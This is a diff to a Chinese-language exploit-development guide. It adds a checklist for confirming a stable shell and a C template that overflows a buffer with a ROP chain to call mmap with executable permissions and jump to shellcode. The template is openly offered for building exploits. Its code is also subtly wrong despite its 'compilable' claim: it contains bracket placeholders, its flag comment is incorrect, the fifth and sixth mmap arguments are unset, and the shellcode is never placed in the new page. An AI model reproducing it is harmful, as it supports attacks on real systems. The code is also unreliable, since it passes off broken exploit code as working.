@@ -73,9 +73,64 @@ python3 -c "from pwn import *; print(one_gadget(libc))"  # 单 gadget
 
 ## 五、验证
 
-- payload 能稳定触发漏洞
-- 拿到预期权限（shell / 代码执行）
-- 多轮运行不崩溃（稳定化）
+- [ ] payload 能稳定触发漏洞（多次发送均命中漏洞点，无随机失败）
+- [ ] 拿到预期权限（`id`/`whoami` 确认 shell 或代码执行）
+- [ ] 多轮运行不崩溃（连续 20+ 次触发，成功率 ≥ 95%）
+- [ ] 绕过的防护标志已确认失效（NX 执行、canary 检测、ASLR 泄露均验证）
+- [ ] ROP 链栈对齐正确（`rsp` 8 字节对齐，无段错误）
+
+## 五·五、代码骨架：NX 绕过 ROP 执行 shellcode 模板
+
+> 可编译运行的 NX 绕过骨架，用 ROP 调 mmap 创建可执行页，再跳转 shellcode。关键地址按样本替换。
+
+```c
+// nx_bypass_rop.c — NX 绕过 ROP 骨架（64 bit Linux）
+// 原理：栈不可执行时，用 ROP 调 mmap(PROT_EXEC) 创建可执行页，跳过去执行 shellcode
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+// 占位：从泄露/ROPgadget 获取
+unsigned long mmap_addr   = [MMAP_ADDR];      // libc mmap
+unsigned long mmap_prot   = 0x7;              // PROT_READ|PROT_WRITE|PROT_EXEC
+unsigned long mmap_flags  = 0x22;             // MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK
+unsigned long mmap_len    = 0x1000;
+unsigned long mmap_fd     = -1;
+unsigned long mmap_offset = 0;
+unsigned long pop_rdi     = [POP_RDI_GADGET]; // "pop rdi; ret"
+unsigned long ret_gadget  = [RET_GADGET];     // "ret"
+
+// 构造 ROP 链：mmap(0, len, prot, flags, fd, offset) → 跳 shellcode
+unsigned long rop[] = {
+    pop_rdi, 0,                    // rdi = 0 (addr)
+    [POP_RSI_GADGET], 0x1000,     // rsi = len（占位）
+    [POP_RDX_GADGET], mmap_prot,  // rdx = prot
+    [POP_RCX_GADGET], mmap_flags, // rcx = flags
+    mmap_addr,                    // 调 mmap
+    [RET_GADGET], [RET_GADGET], [RET_GADGET],  // 对齐
+    [SHELLCODE_ADDR],             // 跳 shellcode（mmap 返回地址填这里）
+};
+
+int main() {
+    char payload[512];
+    unsigned long *p = (unsigned long*)payload;
+    int off = [OFFSET];  // 溢出到返回地址的偏移
+
+    memset(payload, 'A', off);
+    // 填 ROP 链
+    for (size_t i = 0; i < sizeof(rop)/sizeof(unsigned long); i++)
+        p[off/8 + i] = rop[i];
+
+    // 发送 payload（stdin/管道/socket 按场景）
+    write(1, payload, sizeof(payload));
+    return 0;
+}
+```
+
+编译：`gcc -o nx_bypass_rop nx_bypass_rop.c`。验证：触发后 mmap 创建可执行页，shellcode 执行，`id` 显示 uid=0 或拿到 shell。
+
+> 更新：2026-11-17 · 来源：骨架为通用模板，配合 §一 NX 绕过原理使用
 
 ## NX/DEP 绕过全表与 mprotect 链
 
